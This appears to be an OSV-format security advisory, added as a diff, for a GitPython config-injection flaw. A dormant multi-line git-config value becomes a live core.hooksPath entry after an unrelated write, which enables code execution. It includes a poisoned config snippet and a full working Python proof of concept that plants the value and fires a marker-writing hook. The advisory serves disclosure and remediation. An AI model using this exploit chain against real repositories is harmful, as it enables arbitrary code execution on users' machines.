@@ -1,0 +1,172 @@
+{
+  "id": "GHSA-284h-m62q-gf8w",
+  "modified": "2026-09-08T19:00:06.885837775Z",
+  "published": "2026-09-08T18:39:40Z",
+  "aliases": [
+    "CVE-2026-78676",
+    "PYSEC-2026-3786"
+  ],
+  "summary": "GitPython: Dormant multi-line git-config values are corrupted into live injected directives (e.g. core.hooksPath) on any unrelated GitConfigParser write, enabling RCE",
+  "details": "- **CWE:** CWE-88 (Argument Injection) / CWE-94 (Code Injection) — via a read-then-corrupt-on-rewrite config round trip, not a direct setter argument\n- **Affected component:** `git/config.py` — `GitConfigParser._read()` (multi-line value decoding, lines 444-541, esp. `string_decode()` at line 460 and its call sites at 519/541) and `GitConfigParser._write()`/`write_section()` (serialization, lines ~694-712, esp. line 708)\n- **Affected version:** GitPython at HEAD (`9729ed3b948f2bde09f1f188c5311e172212b67e`, 2026-08-05, VERSION `3.1.58`)\n\n## Reachability\nGitPython added `UNSAFE_CONFIG_CHARS_RE` / `_value_to_string_safe()` / `_assure_config_name_safe()` guards (commits `c417af46`, `1ed1b924`, `a495ccd3`, and PR #2176) to reject a Python string containing a raw `\\r`/`\\n`/NUL byte, or syntax-bearing characters, when it is passed as an **argument** to `set()`, `set_value()`, `add_value()`, or `add_section()`. This closed the four config-injection GHSAs above.\n\nThat guard is applied only on the write-argument surface. It is never consulted for values that entered `GitConfigParser._sections` via `_read()` — i.e. values that came from parsing an on-disk config file. And `_read()` legitimately supports standard, spec-compliant git config syntax for multi-line values: a quoted value that is not closed on the same physical line continues onto the next physical line (git's own backslash-continuation syntax), and `string_decode()` (`.decode('unicode_escape')`) decodes a literal two-character `\\n` **escape sequence** inside such a value into a real embedded LF character in the resulting Python string. No raw control byte is ever written to disk to achieve this — it's the same syntax real `git` itself uses and accepts.\n\nThe bug is in what happens when that `GitConfigParser` is later **flushed**: `write_section()` (line ~694) calls the *unsafe* `self._value_to_string(v)` — not `_value_to_string_safe()` — and \"handles\" any embedded newline in the value with `.replace(\"\\n\", \"\\n\\t\")` (line 708), emitting a bare, unquoted `\u003creal newline\u003e\u003ctab\u003e` in the output file with no re-quoting and no backslash-continuation marker. Real git does **not** treat an indentation-only continuation the way GitPython's writer assumes — a value only continues across physical lines when the *previous* line ends in a literal `\\` immediately before the newline. So the moment `write_section()` re-serializes a previously-decoded multi-line value this way, the second half of that value becomes an **independent, new config line** the next time anyone (GitPython or real `git`) parses the file. If an attacker chooses the dormant value's content to be `\u003canything\u003e\\nhooksPath = \u003cattacker path\u003e`, that second line is parsed as a brand-new `core.hooksPath = \u003cattacker path\u003e` directive — live, real Git configuration, not a value.\n\n`core.hooksPath` is honored by essentially every hook-firing git operation (`commit`, `checkout`, `merge`, `push`, `rebase`, ...), giving arbitrary code execution the next time the host application performs any hook-triggering operation.\n\n## Root cause\n`GitConfigParser`'s injection guard is asymmetric: it hardens every *write-argument* entry point (the fix for the four sibling GHSAs) but never hardens the **read → corrupt-on-rewrite round trip**. A value that is 100% legitimate and inert as parsed from disk becomes a newly-injected directive purely through GitPython's own broken re-serialization logic (`write_section()` using the unsafe value-to-string path plus a continuation scheme real git doesn't recognize). The `c417af46` commit message even states its intent explicitly: *\"This preserves existing read behavior for config files that already contain multiline values while preventing GitPython from writing new unsafe values\"* — i.e. the maintainers consciously scoped the fix to the write-argument surface and did not address what happens when an already-resident multi-line value gets rewritten.\n\n## Exploit path\n1. A `.git/config` (or any file merged into it via `[include]`, see below) already contains a dormant, syntactically-legitimate multi-line quoted value, e.g.:\n   ```\n   [core]\n   \tzzz = \"A\\nhooksPath = ../evil-hooks\\\n   \"\n   ```\n   No raw `\\r`, `\\n`, or NUL byte appears on disk — this is standard git quoting + backslash-continuation. Real `git config --get core.hookspath` returns nothing at this point (inert); `git config --get core.zzz` returns the decoded string `A\\nhooksPath = ../evil-hooks`, identically to GitPython's own reader.\n2. The host application opens this repo with GitPython (`git.Repo(path)`, `read_only=False` implicitly for a normal `config_writer()` use) and performs **any** single, unrelated, legitimate config write on the same `GitConfigParser` instance — e.g. `repo.config_writer().set_value(\"user\", \"name\", \"Test User\")`. This is one of the most ordinary operations a GitPython-based tool performs.\n3. `GitConfigParser._write()`/`write_section()` re-serializes every resident value, including the dormant `zzz` entry, using the unsafe path. The file on disk now contains, verbatim:\n   ```\n   [core]\n   \t...\n   \tzzz = A\n   \thooksPath = ../evil-hooks\n   ```\n4. Real `git config --get core.hookspath` now returns `../evil-hooks` — a key that did not exist before step 2, created purely by GitPython's own write.\n5. The next hook-firing git operation (e.g. `git commit`) executes `../evil-hooks/pre-commit` (or whatever hook name the operation looks for), i.e. arbitrary attacker-chosen code execution.\n\n## Impact\nArbitrary code execution, on par with (and more directly triggered than) the already-accepted, High-severity `GHSA-mv93-w799-cj2w`/`GHSA-v87r-6q3f-2j67` \"Newline injection... enables RCE via core.hooksPath\" advisories, and requiring **no unsafe caller argument at all** — only an attacker-influenced config file plus one ordinary, unrelated write.\n\n## Preconditions\n- A config file GitPython opens read-write already contains an attacker-chosen, syntactically-valid multi-line value shaped like `\u003canything\u003e\\n\u003cinjected-key\u003e = \u003cinjected-value\u003e`. Realistic delivery:\n  1. **Pre-existing `.git` directory shipped with a repository** — vendored/template repos, CI workspace/layer caches that preserve `.git`, \"repo\" tarball/zip distributions that include `.git/config`. The poisoned value sits directly in `.git/config`.\n  2. **The documented shared-config `[include]` pattern** (`[include] path = ../\u003crepo-tracked-file\u003e`, pointing at a file inside the working tree) — `GitConfigParser.read()` merges included files' sections into the same `_sections` dict used for writing, so a malicious public repository can ship the poisoned value inside a normal tracked file and have it activated the first time any GitPython-based tool performs any unrelated config write after clone (this requires the victim's own `.git/config` to already reference the include, e.g. via project setup tooling that adds `include.path`).\n  3. **Any host application that opens an attacker-influenced config file for read-write and later performs a legitimate write** — the exact trust-boundary the maintainers already accepted as realistic for `GHSA-v87r-6q3f-2j67` (their writeup cites MLRun's `project.push()`).\n- No authentication/role requirement inside GitPython itself.\n\n## Evidence\n- `git/config.py:460` (`string_decode`), invoked at `git/config.py:519` and `:541` inside `_read()`'s multi-line handling — decodes `unicode_escape`, turning a literal `\\n` escape into a real embedded LF.\n- `git/config.py:~694-712` (`_write()`/`write_section()`) — uses `self._value_to_string(v)` (unsafe variant) and `.replace(\"\\n\", \"\\n\\t\")` with no re-quoting.\n- `c417af46` (the CR/LF/NUL guard commit) touches only the setter path and explicitly states it preserves existing *read* behavior for multi-line values, per its own commit message.\n- `git log -S\"string_decode\"`, `-S\"write_section\"`, `-S'replace(\"\\n\", \"\\n\\t\")'` on `git/config.py` show these code paths have only ever been touched by non-security formatting/refactor commits (`a5fc1d86`, `b825dc74`, `cb68eef0`, `21ec5299`), never by a security fix.\n- PoC (`gitpython-002-poc.py`, embedded below) reproduces the full chain end-to-end against this exact checkout: dormant value → one unrelated `config_writer()` write → `core.hookspath` becomes live per real `git config --get` → a subsequent `git commit` executes the injected hook and writes a benign marker file.\n\n## False-positive check (adversarial re-read)\n- **Is this just a repeat of the four already-fixed config-injection GHSAs?** No — all four require the *caller* to pass a Python string containing a raw control character or forbidden syntax character as an argument to a setter; all four are now blocked by `UNSAFE_CONFIG_CHARS_RE`/`VALID_CONFIG_OPTION_NAME_RE`/the section quote-state-machine. This finding requires no such caller argument: the payload is smuggled entirely inside a config *file* using standard, valid git escaping that the guard never inspects, and only becomes dangerous through GitPython's own unguarded re-serialization of a value it already holds. Confirmed via `_known-advisories.json` (26 entries, none withdrawn) — none describe this read→corrupt-on-rewrite mechanism.\n- **Does real git actually round-trip this value safely (i.e. is this a GitPython-only bug, not a \"normal\" file)?** Yes, confirmed empirically: after the same crafted `.git/config` is rewritten by *real* `git config user.name Test2` (a control test), the multi-line `zzz` entry is preserved byte-for-byte in its original quoted/continuation form — only GitPython's writer corrupts it.\n- **Is there a guard elsewhere that would catch the resulting bare `hooksPath = ...` line before it's trusted?** No — once on disk, it is indistinguishable from a directive the user set intentionally; `core.hooksPath` is honored unconditionally by git's hook-invocation machinery.\n- **Does this require an unrealistic precondition?** The precondition (a config file with attacker-influenced content, later legitimately rewritten) mirrors the exact threat model the maintainers already treated as realistic and fixed for `GHSA-v87r-6q3f-2j67`.\n- Verdict: no concrete blocker found. **CONFIRMED** — reproduced independently end-to-end (dormant value in place → benign unrelated `config_writer()` write → `core.hookspath` live per real git → hook fires on `git commit`, marker file written).\n\n## Remediation\nEither (a) make `write_section()`/`_write()` use `_value_to_string_safe()` (or equivalent re-quoting) for **every** resident value, including those that originated from `_read()`, so an embedded newline is always re-emitted as a properly quoted+backslash-continued value rather than a bare new line, or (b) reject/neutralize embedded control characters in values at read time before they can reach `_sections` at all if the parser is opened in `read_only=False` mode, or (c) canonicalize output using git's own `git config --file \u003cpath\u003e --replace-all` semantics instead of a hand-rolled writer. Option (a) is the most surgical fix and matches the spirit of `_value_to_string_safe()` already used on the setter path.\n\n## Confidence\nHigh. Root cause independently re-derived and confirmed by direct code reading; full exploit chain (dormant value → benign unrelated write → live `core.hookspath` → hook execution with a benign marker) reproduced twice, independently, against the current HEAD.\n\n\n## Proof-of-Concept source (`gitpython-002-poc.py`)\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nGITPYTHON-002 PoC: a dormant, legitimately-encoded multi-line git-config value\n(standard quoted + backslash-continuation syntax, containing an escaped \"\\\\n\"\nthat decodes to a real embedded newline in memory) is corrupted into a NEW,\nlive config key the moment GitConfigParser re-serializes it during any\nunrelated write. If the smuggled second \"line\" looks like\n\"hooksPath = \u003cattacker path\u003e\", it becomes a real, active core.hooksPath after\none unrelated GitPython config write, and fires attacker code on the next\nhook-triggering git operation (e.g. `git commit`).\n\nThis is CWE-88/CWE-94 style argument/config injection, but via the READ path\n(a config file GitPython parses and later rewrites), not via a Python kwarg\nargument -- distinct from the already-fixed GHSA-mv93-w799-cj2w /\nGHSA-v87r-6q3f-2j67 / GHSA-3rp5-jjmw-4wv2 / GHSA-jm78-9fvv-mhgr, which all\nguard the setter-argument surface only.\n\nRun:\n  PYTHONPATH=\"\u003crepo\u003e:\u003crepo\u003e/gitdb:\u003crepo\u003e/smmap\" python3 gitpython-002-poc.py \u003cworkdir\u003e\n\nBenign: only writes/reads inside \u003cworkdir\u003e. The \"malicious\" hook just writes a\nmarker file; no destructive/exfiltrating payload. Exits non-zero and prints\n\"NOT VULNERABLE\" if the corruption / hook does not fire.\n\"\"\"\nimport os\nimport subprocess\nimport sys\n\n\ndef main():\n    workdir = sys.argv[1] if len(sys.argv) \u003e 1 else \"/tmp/gitpython-002-poc\"\n    repo_dir = os.path.join(workdir, \"repo\")\n    hooks_dir = os.path.join(workdir, \"evil-hooks\")\n    marker = os.path.join(workdir, \"PWNED_MARKER.txt\")\n\n    for p in (repo_dir, hooks_dir):\n        os.makedirs(p, exist_ok=True)\n    if os.path.exists(marker):\n        os.remove(marker)\n\n    subprocess.run([\"git\", \"init\", \"-q\", \"-b\", \"main\", repo_dir], check=True)\n    subprocess.run([\"git\", \"-C\", repo_dir, \"config\", \"user.email\", \"test@example.com\"], check=True)\n    subprocess.run([\"git\", \"-C\", repo_dir, \"config\", \"user.name\", \"Test\"], check=True)\n\n    # Rewrite .git/config with a dormant, 100%-valid multi-line quoted value\n    # inside [core] (before any other section). No raw CR/LF/NUL byte is\n    # written to disk here -- this is standard git config quoting +\n    # backslash-line-continuation, decoded by both real git and GitConfigParser\n    # into the Python string 'A\\nhooksPath = ../evil-hooks'.\n    cfg_path = os.path.join(repo_dir, \".git\", \"config\")\n    with open(cfg_path) as f:\n        original = f.read()\n    poisoned_entry = '\\tzzz = \"A\\\\nhooksPath = ../evil-hooks\\\\\\n\"\\n'\n    # Insert right after the [core] header line so it lives in the same section.\n    new_config = original.replace(\"[core]\\n\", \"[core]\\n\" + poisoned_entry, 1)\n    with open(cfg_path, \"w\") as f:\n        f.write(new_config)\n\n    # Confirm it's inert per real git before touching GitPython.\n    pre = subprocess.run(\n        [\"git\", \"-C\", repo_dir, \"config\", \"--get\", \"core.hookspath\"],\n        capture_output=True, text=True,\n    )\n    if pre.returncode == 0:\n        print(\"SETUP ERROR: core.hookspath already set before GitPython touched anything\")\n        sys.exit(2)\n\n    # Malicious hook: benign marker only.\n    hook_path = os.path.join(hooks_dir, \"pre-commit\")\n    with open(hook_path, \"w\") as f:\n        f.write('#!/bin/sh\\necho \"PWNED-VIA-GITPYTHON-CONFIG-INJECTION\" \u003e \"%s\"\\nexit 0\\n' % marker)\n    os.chmod(hook_path, 0o755)\n\n    import git  # gitpython under test\n\n    repo = git.Repo(repo_dir)\n    before = repo.config_reader().get_value(\"core\", \"zzz\")\n    print(\"core.zzz before any GitPython write =\", repr(before))\n\n    # ONE totally unrelated, benign write -- this is the only \"attacker-adjacent\"\n    # action required, and it is something virtually every GitPython consumer\n    # does routinely (setting an option, adding a remote, updating a branch's\n    # tracking config, ...).\n    with repo.config_writer() as cw:\n        cw.set_value(\"user\", \"name\", \"Test User\")\n\n    post = subprocess.run(\n        [\"git\", \"-C\", repo_dir, \"config\", \"--get\", \"core.hookspath\"],\n        capture_output=True, text=True,\n    )\n    if post.returncode != 0:\n        print(\"NOT VULNERABLE: core.hookspath still absent after the unrelated write\")\n        sys.exit(1)\n\n    injected_path = post.stdout.strip()\n    print(\"core.hookspath is now LIVE after one unrelated write:\", injected_path)\n\n    # Trigger the hook with a normal commit to prove it fires.\n    with open(os.path.join(repo_dir, \"file2.txt\"), \"w\") as f:\n        f.write(\"change\\n\")\n    subprocess.run([\"git\", \"-C\", repo_dir, \"add\", \"file2.txt\"], check=True)\n    subprocess.run(\n        [\"git\", \"-C\", repo_dir, \"-c\", \"user.email=t@example.com\", \"-c\", \"user.name=T\",\n         \"commit\", \"-q\", \"-m\", \"trigger hook\"],\n        check=True,\n    )\n\n    if os.path.isfile(marker):\n        with open(marker) as f:\n            content = f.read().strip()\n        print(\"VULNERABLE: hook fired, marker content =\", content)\n        sys.exit(0)\n    else:\n        print(\"NOT VULNERABLE: hook did not fire\")\n        sys.exit(1)\n\n\nif __name__ == \"__main__\":\n    main()\n\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "gitpython",
+        "purl": "pkg:pypi/gitpython"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.1.59"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.7",
+        "0.2.0-beta1",
+        "0.3.0-beta1",
+        "0.3.0-beta2",
+        "0.3.1-beta2",
+        "0.3.2",
+        "0.3.2.1",
+        "0.3.2.RC1",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "2.0.0",
+        "2.0.1",
+        "2.0.2",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.0.8",
+        "2.0.9",
+        "2.0.9.dev0",
+        "2.0.9.dev1",
+        "2.1.0",
+        "2.1.1",
+        "2.1.10",
+        "2.1.11",
+        "2.1.12",
+        "2.1.13",
+        "2.1.14",
+        "2.1.15",
+        "2.1.2",
+        "2.1.3",
+        "2.1.4",
+        "2.1.5",
+        "2.1.6",
+        "2.1.7",
+        "2.1.8",
+        "2.1.9",
+        "3.0.0",
+        "3.0.1",
+        "3.0.2",
+        "3.0.3",
+        "3.0.4",
+        "3.0.5",
+        "3.0.6",
+        "3.0.7",
+        "3.0.8",
+        "3.0.9",
+        "3.1.0",
+        "3.1.1",
+        "3.1.10",
+        "3.1.11",
+        "3.1.12",
+        "3.1.13",
+        "3.1.14",
+        "3.1.15",
+        "3.1.16",
+        "3.1.17",
+        "3.1.18",
+        "3.1.19",
+        "3.1.2",
+        "3.1.20",
+        "3.1.22",
+        "3.1.23",
+        "3.1.24",
+        "3.1.25",
+        "3.1.26",
+        "3.1.27",
+        "3.1.28",
+        "3.1.29",
+        "3.1.3",
+        "3.1.30",
+        "3.1.31",
+        "3.1.32",
+        "3.1.33",
+        "3.1.34",
+        "3.1.35",
+        "3.1.36",
+        "3.1.37",
+        "3.1.38",
+        "3.1.4",
+        "3.1.40",
+        "3.1.41",
+        "3.1.42",
+        "3.1.43",
+        "3.1.44",
+        "3.1.45",
+        "3.1.46",
+        "3.1.47",
+        "3.1.48",
+        "3.1.49",
+        "3.1.5",
+        "3.1.50",
+        "3.1.51",
+        "3.1.52",
+        "3.1.53",
+        "3.1.54",
+        "3.1.55",
+        "3.1.56",
+        "3.1.57",
+        "3.1.58",
+        "3.1.6",
+        "3.1.7",
+        "3.1.8",
+        "3.1.9"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.1.58",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-284h-m62q-gf8w/GHSA-284h-m62q-gf8w.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-284h-m62q-gf8w"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-78676"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gitpython-developers/GitPython"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2026-3786.yaml"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.vulncheck.com/advisories/gitpython-before-remote-code-execution-via-config-injection"
+    }
+  ]
+}
